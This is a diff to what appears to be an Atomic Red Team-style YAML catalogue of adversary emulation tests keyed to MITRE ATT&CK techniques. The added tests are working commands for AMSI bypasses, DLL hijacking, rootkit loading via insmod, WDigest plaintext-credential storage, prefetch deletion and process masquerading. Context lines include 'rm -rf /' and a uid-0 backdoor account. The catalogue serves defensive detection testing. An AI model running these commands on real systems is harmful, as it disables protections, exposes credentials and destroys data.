@@ -1273,6 +1273,122 @@ persistence:
         command: |-
           useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
           echo "#{password}" | passwd --stdin #{username}
+  T1038:
+    technique:
+      external_references:
+      - url: https://attack.mitre.org/techniques/T1038
+        source_name: mitre-attack
+        external_id: T1038
+      - url: https://capec.mitre.org/data/definitions/471.html
+        source_name: capec
+        external_id: CAPEC-471
+      - url: http://msdn.microsoft.com/en-US/library/ms682586
+        source_name: Microsoft DLL Search
+        description: Microsoft. (n.d.). Dynamic-Link Library Search Order. Retrieved
+          November 30, 2014.
+      - url: http://blogs.technet.com/b/msrc/archive/2010/08/21/microsoft-security-advisory-2269637-released.aspx
+        source_name: Microsoft 2269637
+        description: Microsoft. (2010, August 22). Microsoft Security Advisory 2269637
+          Released. Retrieved December 5, 2014.
+      - url: http://msdn.microsoft.com/en-US/library/ms682600
+        source_name: Microsoft DLL Redirection
+        description: Microsoft. (n.d.). Dynamic-Link Library Redirection. Retrieved
+          December 5, 2014.
+      - url: https://msdn.microsoft.com/en-US/library/aa375365
+        source_name: Microsoft Manifests
+        description: Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.
+      - url: https://www.mandiant.com/blog/dll-search-order-hijacking-revisited/
+        source_name: Mandiant Search Order
+        description: Mandiant. (2010, August 31). DLL Search Order Hijacking Revisited.
+          Retrieved December 5, 2014.
+      - url: https://www.owasp.org/index.php/Binary_planting
+        source_name: OWASP Binary Planting
+        description: OWASP. (2013, January 30). Binary planting. Retrieved June 7,
+          2016.
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_contributors:
+      - Stefan Kanthak
+      - Travis Smith, Tripwire
+      x_mitre_data_sources:
+      - File monitoring
+      - DLL monitoring
+      - Process monitoring
+      - Process command-line parameters
+      modified: '2018-10-17T00:14:20.652Z'
+      x_mitre_detection: Monitor file systems for moving, renaming, replacing, or
+        modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared
+        with past behavior) that do not correlate with known software, patches, etc.,
+        are suspicious. Monitor DLLs loaded into a process and detect DLLs that have
+        the same file name but abnormal paths. Modifications to or creation of .manifest
+        and .local redirection files that do not correlate with software updates are
+        suspicious.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_platforms:
+      - Windows
+      kill_chain_phases:
+      - phase_name: persistence
+        kill_chain_name: mitre-attack
+      - phase_name: privilege-escalation
+        kill_chain_name: mitre-attack
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      x_mitre_defense_bypassed:
+      - Process whitelisting
+      description: "Windows systems use a common method to look for required DLLs
+        to load into a program. (Citation: Microsoft DLL Search) Adversaries may take
+        advantage of the Windows DLL search order and programs that ambiguously specify
+        DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform
+        DLL preloading, also called binary planting attacks, (Citation: OWASP Binary
+        Planting) by placing a malicious DLL with the same name as an ambiguously
+        specified DLL in a location that Windows searches before the legitimate DLL.
+        Often this location is the current working directory of the program. Remote
+        DLL preloading attacks occur when a program sets its current directory to
+        a remote location such as a Web share before loading a DLL. (Citation: Microsoft
+        2269637) Adversaries may use this behavior to cause the program to load a
+        malicious DLL. \n\nAdversaries may also directly modify the way a program
+        loads DLLs by replacing an existing DLL or modifying a .manifest or .local
+        redirection file, directory, or junction to cause the program to load a different
+        DLL to maintain persistence or privilege escalation. (Citation: Microsoft
+        DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search
+        Order)\n\nIf a search order-vulnerable program is configured to run at a higher
+        privilege level, then the adversary-controlled DLL that is loaded will also
+        be executed at the higher level. In this case, the technique could be used
+        for privilege escalation from user to administrator or SYSTEM or from administrator
+        to SYSTEM, depending on the program.\n\nPrograms that fall victim to path
+        hijacking may appear to behave normally because malicious DLLs may be configured
+        to also load the legitimate DLLs they were meant to replace."
+      id: attack-pattern--46944654-fcc1-4f63-9dad-628102376586
+      name: DLL Search Order Hijacking
+      created: '2017-05-31T21:30:40.604Z'
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      - SYSTEM
+      x_mitre_effective_permissions:
+      - User
+      - Administrator
+      - SYSTEM
+      x_mitre_system_requirements:
+      - Ability to add a DLL, manifest file, or .local file, directory, or junction.
+      identifier: T1038
+    atomic_tests:
+    - name: DLL Search Order Hijacking - amsi.dll
+      description: |
+        Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version
+        of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
+        https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
+          copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
+          cmd.exe /k %APPDATA%\updater.exe
   T1158:
     technique:
       external_references:
@@ -1900,6 +2016,134 @@ persistence:
           /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows
           NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess
           /d "#{payload_binary}"
+
+'
+  T1215:
+    technique:
+      external_references:
+      - url: https://attack.mitre.org/techniques/T1215
+        source_name: mitre-attack
+        external_id: T1215
+      - url: https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf
+        source_name: Linux Kernel Programming
+        description: 'Pomerantz, O., Salzman, P. (2003, April 4). The  (Citation:
+          Linux Kernel Module Programming Guide). Retrieved April 6, 2018.'
+      - url: http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html
+        source_name: Linux Kernel Module Programming Guide
+        description: Pomerantz, O., Salzman, P. (2003, April 4). Modules vs Programs.
+          Retrieved April 6, 2018.
+      - url: http://www.megasecurity.org/papers/Rootkits.pdf
+        source_name: iDefense Rootkit Overview
+        description: Chuvakin, A. (2003, February). An Overview of Rootkits. Retrieved
+          April 6, 2018.
+      - url: https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf
+        source_name: RSAC 2015 San Francisco Patrick Wardle
+        description: Wardle, P. (2015, April). Malware Persistence on OS X Yosemite.
+          Retrieved April 6, 2018.
+      - url: https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/
+        source_name: Synack Secure Kernel Extension Broken
+        description: Wardle, P. (2017, September 8). High Sierra’s ‘Secure Kernel
+          Extension Loading’ is Broken. Retrieved April 6, 2018.
+      - url: https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/
+        source_name: Securelist Ventir
+        description: 'Mikhail, K. (2014, October 16). The Ventir Trojan: assemble
+          your MacOS spy. Retrieved April 6, 2018.'
+      - url: https://en.wikipedia.org/wiki/Loadable_kernel_module#Linux
+        source_name: Wikipedia Loadable Kernel Module
+        description: Wikipedia. (2018, March 17). Loadable kernel module. Retrieved
+          April 9, 2018.
+      - url: http://tldp.org/HOWTO/Module-HOWTO/x197.html
+        source_name: Linux Loadable Kernel Module Insert and Remove LKMs
+        description: Henderson, B. (2006, September 24). How To Insert And Remove
+          LKMs. Retrieved April 9, 2018.
+      - url: https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/
+        source_name: CrowdStrike Linux Rootkit
+        description: Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit.
+          Retrieved December 21, 2017.
+      - url: https://github.com/f0rb1dd3n/Reptile
+        source_name: GitHub Reptile
+        description: Augusto, I. (2018, March 8). Reptile - LMK Linux rootkit. Retrieved
+          April 9, 2018.
+      - url: https://github.com/m0nad/Diamorphine
+        source_name: GitHub Diamorphine
+        description: Mello, V. (2018, March 8). Diamorphine - LMK rootkit for Linux
+          Kernels 2.6.x/3.x/4.x (x86 and x86_64). Retrieved April 9, 2018.
+      - url: https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html
+        source_name: Volatility Phalanx2
+        description: 'Case, A. (2012, October 10). Phalanx 2 Revealed: Using Volatility
+          to Analyze an Advanced Linux Rootkit. Retrieved April 9, 2018.'
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_contributors:
+      - Jeremy Galloway
+      - Red Canary
+      x_mitre_data_sources:
+      - System calls
+      - Process monitoring
+      - Process command-line parameters
+      modified: '2018-10-31T13:45:13.024Z'
+      x_mitre_detection: |-
+        LKMs are typically loaded into <code>/lib/modules</code> and have had the extension .ko ("kernel object") since version 2.6 of the Linux kernel. (Citation: Wikipedia Loadable Kernel Module)
+
+        Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. 
+        These are typically obtained through the operating systems package manager and installed like a normal package.
+
+        Adversaries will likely run these commands on the target system before loading a malicious module in order to ensure that it is properly compiled. (Citation: iDefense Rootkit Overview)
+
+        On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)</code>
+
+        On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)</code>
+
+        Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands:<code>modprobe insmod lsmod rmmod modinfo</code> (Citation: Linux Loadable Kernel Module Insert and Remove LKMs)
+
+        For macOS, monitor for execution of <code>kextload</code> commands and correlate with other unknown or suspicious activity.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      kill_chain_phases:
+      - phase_name: persistence
+        kill_chain_name: mitre-attack
+      id: attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5
+      name: Kernel Modules and Extensions
+      created: '2018-04-18T17:59:24.739Z'
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      description: |-
+        Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming) When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)
+
+        Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)
+
+        Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)
+      x_mitre_permissions_required:
+      - root
+      identifier: T1215
+    atomic_tests:
+    - name: Linux - Load Kernel Module via insmod
+      description: 'This test uses the insmod command to load a kernel module for
+        Linux.
+
+'
+      supported_platforms:
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        kernel_module_file:
+          description: KO object containing kernel module code.
+          type: path
+          default: diamorphine.ko
+        module_name:
+          description: Kernel module name once loaded.
+          type: string
+          default: diamorphine
+      executor:
+        name: bash
+        elevation_required: true
+        command: 'insmod #{kernel_module_file}
+
+'
+        cleanup_command: 'rmmod #{module_name}
 
 '
   T1159:
@@ -3485,7 +3729,7 @@ persistence:
         command: |
           copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"
           reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
-          reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverTimeout /t REG_SZ /d 60 /f
+          reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
           reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
           reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
           shutdown /r /t 0
@@ -4769,7 +5013,7 @@ defense-evasion:
           type: path
           default: C:\Windows\System32\cmd.exe
       executor:
-        name: command_prompt
+        name: powershell
         command: |
           New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
@@ -5467,6 +5711,122 @@ defense-evasion:
           2. Start another mimikatz with DA privileges. This is the instance which registers a DC and is used to "push" the attributes.
           3. lsadump::dcshadow /object:ops-user19$ /attribute:userAccountControl /value:532480
           4. lsadump::dcshadow /push
+  T1038:
+    technique:
+      external_references:
+      - url: https://attack.mitre.org/techniques/T1038
+        source_name: mitre-attack
+        external_id: T1038
+      - url: https://capec.mitre.org/data/definitions/471.html
+        source_name: capec
+        external_id: CAPEC-471
+      - url: http://msdn.microsoft.com/en-US/library/ms682586
+        source_name: Microsoft DLL Search
+        description: Microsoft. (n.d.). Dynamic-Link Library Search Order. Retrieved
+          November 30, 2014.
+      - url: http://blogs.technet.com/b/msrc/archive/2010/08/21/microsoft-security-advisory-2269637-released.aspx
+        source_name: Microsoft 2269637
+        description: Microsoft. (2010, August 22). Microsoft Security Advisory 2269637
+          Released. Retrieved December 5, 2014.
+      - url: http://msdn.microsoft.com/en-US/library/ms682600
+        source_name: Microsoft DLL Redirection
+        description: Microsoft. (n.d.). Dynamic-Link Library Redirection. Retrieved
+          December 5, 2014.
+      - url: https://msdn.microsoft.com/en-US/library/aa375365
+        source_name: Microsoft Manifests
+        description: Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.
+      - url: https://www.mandiant.com/blog/dll-search-order-hijacking-revisited/
+        source_name: Mandiant Search Order
+        description: Mandiant. (2010, August 31). DLL Search Order Hijacking Revisited.
+          Retrieved December 5, 2014.
+      - url: https://www.owasp.org/index.php/Binary_planting
+        source_name: OWASP Binary Planting
+        description: OWASP. (2013, January 30). Binary planting. Retrieved June 7,
+          2016.
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_contributors:
+      - Stefan Kanthak
+      - Travis Smith, Tripwire
+      x_mitre_data_sources:
+      - File monitoring
+      - DLL monitoring
+      - Process monitoring
+      - Process command-line parameters
+      modified: '2018-10-17T00:14:20.652Z'
+      x_mitre_detection: Monitor file systems for moving, renaming, replacing, or
+        modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared
+        with past behavior) that do not correlate with known software, patches, etc.,
+        are suspicious. Monitor DLLs loaded into a process and detect DLLs that have
+        the same file name but abnormal paths. Modifications to or creation of .manifest
+        and .local redirection files that do not correlate with software updates are
+        suspicious.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_platforms:
+      - Windows
+      kill_chain_phases:
+      - phase_name: persistence
+        kill_chain_name: mitre-attack
+      - phase_name: privilege-escalation
+        kill_chain_name: mitre-attack
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      x_mitre_defense_bypassed:
+      - Process whitelisting
+      description: "Windows systems use a common method to look for required DLLs
+        to load into a program. (Citation: Microsoft DLL Search) Adversaries may take
+        advantage of the Windows DLL search order and programs that ambiguously specify
+        DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform
+        DLL preloading, also called binary planting attacks, (Citation: OWASP Binary
+        Planting) by placing a malicious DLL with the same name as an ambiguously
+        specified DLL in a location that Windows searches before the legitimate DLL.
+        Often this location is the current working directory of the program. Remote
+        DLL preloading attacks occur when a program sets its current directory to
+        a remote location such as a Web share before loading a DLL. (Citation: Microsoft
+        2269637) Adversaries may use this behavior to cause the program to load a
+        malicious DLL. \n\nAdversaries may also directly modify the way a program
+        loads DLLs by replacing an existing DLL or modifying a .manifest or .local
+        redirection file, directory, or junction to cause the program to load a different
+        DLL to maintain persistence or privilege escalation. (Citation: Microsoft
+        DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search
+        Order)\n\nIf a search order-vulnerable program is configured to run at a higher
+        privilege level, then the adversary-controlled DLL that is loaded will also
+        be executed at the higher level. In this case, the technique could be used
+        for privilege escalation from user to administrator or SYSTEM or from administrator
+        to SYSTEM, depending on the program.\n\nPrograms that fall victim to path
+        hijacking may appear to behave normally because malicious DLLs may be configured
+        to also load the legitimate DLLs they were meant to replace."
+      id: attack-pattern--46944654-fcc1-4f63-9dad-628102376586
+      name: DLL Search Order Hijacking
+      created: '2017-05-31T21:30:40.604Z'
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      - SYSTEM
+      x_mitre_effective_permissions:
+      - User
+      - Administrator
+      - SYSTEM
+      x_mitre_system_requirements:
+      - Ability to add a DLL, manifest file, or .local file, directory, or junction.
+      identifier: T1038
+    atomic_tests:
+    - name: DLL Search Order Hijacking - amsi.dll
+      description: |
+        Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version
+        of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
+        https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
+          copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
+          cmd.exe /k %APPDATA%\updater.exe
   T1140:
     technique:
       external_references:
@@ -5759,7 +6119,7 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: true
-        prereq_command: 'sc query sysmon
+        prereq_command: 'sc query sysmon > nul
 
 '
         command: 'sysmon -u
@@ -5768,6 +6128,31 @@ defense-evasion:
         cleanup_command: 'sysmon -i -accepteula
 
 '
+    - name: AMSI Bypass - AMSI InitFailed
+      description: "Any easy way to bypass AMSI inspection is it patch the dll in
+        memory setting the \"amsiInitFailed\" function to true. \nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
+        cleanup_command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"
+    - name: AMSI Bypass - Remove AMSI Provider Reg Key
+      description: "With administrative rights, an adversary can remove the AMSI Provider
+        registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis
+        test removes the Windows Defender provider registry key. \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: 'Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"
+          -Recurse
+
+'
+        cleanup_command: New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
+          -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
   T1107:
     technique:
       external_references:
@@ -6000,6 +6385,20 @@ defense-evasion:
       executor:
         name: bash
         command: 'rm -rf / --no-preserve-root > /dev/null 2> /dev/null
+
+'
+    - name: Delete-PrefetchFile
+      description: 'Delete a single prefetch file.  Deletion of prefetch files is
+        a known anti-forensic technique.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: 'Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem
+          -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
 
 '
   T1222:
@@ -7702,6 +8101,45 @@ defense-evasion:
         command: |
           cp /bin/sh /tmp/crond
           /tmp/crond
+    - name: Masquerading - cscript.exe running as notepad.exe
+      description: 'Copies cscript.exe, renames it, and launches it to masquerade
+        as an instance of notepad.exe.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y
+          cmd.exe /c %APPDATA%\notepad.exe /B
+    - name: Masquerading - wscript.exe running as svchost.exe
+      description: 'Copies wscript.exe, renames it, and launches it to masquerade
+        as an instance of svchost.exe.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y
+          cmd.exe /c %APPDATA%\svchost.exe /B
+    - name: Masquerading - powershell.exe running as taskhostw.exe
+      description: 'Copies powershell.exe, renames it, and launches it to masquerade
+        as an instance of taskhostw.exe.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y
+          cmd.exe /K %APPDATA%\taskhostw.exe
   T1112:
     technique:
       external_references:
@@ -7871,6 +8309,23 @@ defense-evasion:
           ### Garbage collection and closing of ntuser.dat ###
           [gc]::Collect()
           reg unload "HKU\$($ProfileList[$p].SID)"
+    - name: Modify registry to store logon credentials
+      description: "Sets registry key that will tell windows to store plaintext passwords
+        (making the system vulnerable to clear text / cleartext password dumping)
+        \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
+          /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+'
+        cleanup_command: 'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
+          /v UseLogonCredential /t REG_DWORD /d 0 /f
+
+'
   T1170:
     technique:
       external_references:
@@ -10718,7 +11173,7 @@ privilege-escalation:
           type: path
           default: C:\Windows\System32\cmd.exe
       executor:
-        name: command_prompt
+        name: powershell
         command: |
           New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
@@ -10762,6 +11217,122 @@ privilege-escalation:
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\fodhelper.exe"
+  T1038:
+    technique:
+      external_references:
+      - url: https://attack.mitre.org/techniques/T1038
+        source_name: mitre-attack
+        external_id: T1038
+      - url: https://capec.mitre.org/data/definitions/471.html
+        source_name: capec
+        external_id: CAPEC-471
+      - url: http://msdn.microsoft.com/en-US/library/ms682586
+        source_name: Microsoft DLL Search
+        description: Microsoft. (n.d.). Dynamic-Link Library Search Order. Retrieved
+          November 30, 2014.
+      - url: http://blogs.technet.com/b/msrc/archive/2010/08/21/microsoft-security-advisory-2269637-released.aspx
+        source_name: Microsoft 2269637
+        description: Microsoft. (2010, August 22). Microsoft Security Advisory 2269637
+          Released. Retrieved December 5, 2014.
+      - url: http://msdn.microsoft.com/en-US/library/ms682600
+        source_name: Microsoft DLL Redirection
+        description: Microsoft. (n.d.). Dynamic-Link Library Redirection. Retrieved
+          December 5, 2014.
+      - url: https://msdn.microsoft.com/en-US/library/aa375365
+        source_name: Microsoft Manifests
+        description: Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.
+      - url: https://www.mandiant.com/blog/dll-search-order-hijacking-revisited/
+        source_name: Mandiant Search Order
+        description: Mandiant. (2010, August 31). DLL Search Order Hijacking Revisited.
+          Retrieved December 5, 2014.
+      - url: https://www.owasp.org/index.php/Binary_planting
+        source_name: OWASP Binary Planting
+        description: OWASP. (2013, January 30). Binary planting. Retrieved June 7,
+          2016.
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_contributors:
+      - Stefan Kanthak
+      - Travis Smith, Tripwire
+      x_mitre_data_sources:
+      - File monitoring
+      - DLL monitoring
+      - Process monitoring
+      - Process command-line parameters
+      modified: '2018-10-17T00:14:20.652Z'
+      x_mitre_detection: Monitor file systems for moving, renaming, replacing, or
+        modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared
+        with past behavior) that do not correlate with known software, patches, etc.,
+        are suspicious. Monitor DLLs loaded into a process and detect DLLs that have
+        the same file name but abnormal paths. Modifications to or creation of .manifest
+        and .local redirection files that do not correlate with software updates are
+        suspicious.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_platforms:
+      - Windows
+      kill_chain_phases:
+      - phase_name: persistence
+        kill_chain_name: mitre-attack
+      - phase_name: privilege-escalation
+        kill_chain_name: mitre-attack
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      x_mitre_defense_bypassed:
+      - Process whitelisting
+      description: "Windows systems use a common method to look for required DLLs
+        to load into a program. (Citation: Microsoft DLL Search) Adversaries may take
+        advantage of the Windows DLL search order and programs that ambiguously specify
+        DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform
+        DLL preloading, also called binary planting attacks, (Citation: OWASP Binary
+        Planting) by placing a malicious DLL with the same name as an ambiguously
+        specified DLL in a location that Windows searches before the legitimate DLL.
+        Often this location is the current working directory of the program. Remote
+        DLL preloading attacks occur when a program sets its current directory to
+        a remote location such as a Web share before loading a DLL. (Citation: Microsoft
+        2269637) Adversaries may use this behavior to cause the program to load a
+        malicious DLL. \n\nAdversaries may also directly modify the way a program
+        loads DLLs by replacing an existing DLL or modifying a .manifest or .local
+        redirection file, directory, or junction to cause the program to load a different
+        DLL to maintain persistence or privilege escalation. (Citation: Microsoft
+        DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search
+        Order)\n\nIf a search order-vulnerable program is configured to run at a higher
+        privilege level, then the adversary-controlled DLL that is loaded will also
+        be executed at the higher level. In this case, the technique could be used
+        for privilege escalation from user to administrator or SYSTEM or from administrator
+        to SYSTEM, depending on the program.\n\nPrograms that fall victim to path
+        hijacking may appear to behave normally because malicious DLLs may be configured
+        to also load the legitimate DLLs they were meant to replace."
+      id: attack-pattern--46944654-fcc1-4f63-9dad-628102376586
+      name: DLL Search Order Hijacking
+      created: '2017-05-31T21:30:40.604Z'
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      - SYSTEM
+      x_mitre_effective_permissions:
+      - User
+      - Administrator
+      - SYSTEM
+      x_mitre_system_requirements:
+      - Ability to add a DLL, manifest file, or .local file, directory, or junction.
+      identifier: T1038
+    atomic_tests:
+    - name: DLL Search Order Hijacking - amsi.dll
+      description: |
+        Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version
+        of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
+        https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
+          copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
+          cmd.exe /k %APPDATA%\updater.exe
   T1179:
     technique:
       external_references:
@@ -13158,7 +13729,7 @@ discovery:
 
 '
     - name: Examine password policy - macOS
-      description: 'Lists the password policy to console on Windows.
+      description: 'Lists the password policy to console on macOS.
 
 '
       supported_platforms:
@@ -13328,21 +13899,9 @@ discovery:
       - User
       identifier: T1069
     atomic_tests:
-    - name: Permission Groups Discovery
-      description: 'Permission Groups Discovery
-
-'
-      supported_platforms:
-      - macos
-      - linux
-      executor:
-        name: sh
-        command: |
-          dscacheutil -q group
-          dscl . -list /Groups
-          groups
-    - name: Permission Groups Discovery Windows
-      description: 'Permission Groups Discovery for Windows
+    - name: Elevated group enumeration using net group
+      description: 'Runs ''net group'' command including command aliases and loose
+        typing to simulate enumeration/discovery of high value domain groups
 
 '
       supported_platforms:
@@ -13351,25 +13910,10 @@ discovery:
         name: command_prompt
         elevation_required: false
         command: |
-          net localgroup
-          net group /domain
-    - name: Permission Groups Discovery PowerShell
-      description: 'Permission Groups Discovery utilizing PowerShell
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        user:
-          description: User to identify what groups a user is a member of
-          type: string
-          default: administrator
-      executor:
-        name: powershell
-        elevation_required: false
-        command: |
-          get-localgroup
-          get-ADPrinicipalGroupMembership #{user} | select name
+          net group /domai 'Domain Admins'
+          net groups 'Account Operators' /doma
+          net groups 'Exchange Organization Management' /doma
+          net group 'BUILTIN\Backup Operators' /doma
   T1057:
     technique:
       external_references:
@@ -13600,7 +14144,7 @@ discovery:
         command: |
           net view /domain
           net view
-    - name: Remote System Discover - ping sweep
+    - name: Remote System Discovery - ping sweep
       description: 'Identify remote systems via ping sweep
 
 '
@@ -13612,7 +14156,7 @@ discovery:
         command: 'for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
 
 '
-    - name: Remote System Discover - arp
+    - name: Remote System Discovery - arp
       description: 'Identify remote systems via arp
 
 '
@@ -13651,6 +14195,23 @@ discovery:
           0 ] && echo "192.168.1.$ip UP" || : ; done
 
 '
+    - name: Remote System Discovery - nslookup
+      description: 'Powershell script that runs nslookup on cmd.exe against the local
+        /24 network of the first network adaptor listed in ipconfig
+
+'
+      supported_platforms:
